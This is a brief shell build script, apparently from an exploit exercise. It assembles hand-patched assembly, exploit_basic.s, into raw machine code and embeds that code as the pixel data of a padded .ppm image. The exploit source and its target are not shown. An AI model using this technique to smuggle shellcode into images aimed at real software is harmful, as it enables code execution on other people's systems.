
# DO NOT use these commands, the .s file is manually modified
# because the syscall() method has a different calling convention than the syscall itself
#gcc -S exploit_basic.c -o exploit_basic.s
# fix syscall
#sed -i 's/call.*syscall@PLT/syscall/' exploit_basic.s
# assemble
as exploit_basic.s -c -o exploit_basic.o
# extract code
objcopy -O binary -j .text exploit_basic.o exploit_basic.bin
# generate image
echo -en "P5\n200 200 255\n" > exploit_basic.ppm
cat exploit_basic.bin >> exploit_basic.ppm
# fill pixels (more than we need, but doesnt matter)
dd if=/dev/zero bs=1 count=40000 >> exploit_basic.ppm
